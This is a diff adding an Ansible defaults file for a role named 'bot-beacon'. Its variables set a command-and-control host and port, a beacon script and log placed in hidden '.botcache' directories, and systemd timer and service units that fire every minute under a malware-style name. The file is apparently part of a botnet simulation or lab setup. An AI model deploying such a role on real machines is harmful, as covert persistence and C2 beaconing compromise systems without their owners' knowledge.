@@ -1,0 +1,12 @@
+---
+# defaults file for bot-beacon
+
+beacon_user: cyrano
+c2_host: c2-server
+c2_port: 2222
+beacon_schedule: "*:0/1"
+beacon_delay_seconds: 30
+beacon_script_path: /usr/local/lib/.botcache/beacon.sh
+beacon_log: /var/lib/.botcache/beacon.log
+beacon_timer_unit: "bot-beacon-Hilix.x86.elf.timer"
+beacon_service_unit: "bot-beacon-Hilix.x86.elf.service"
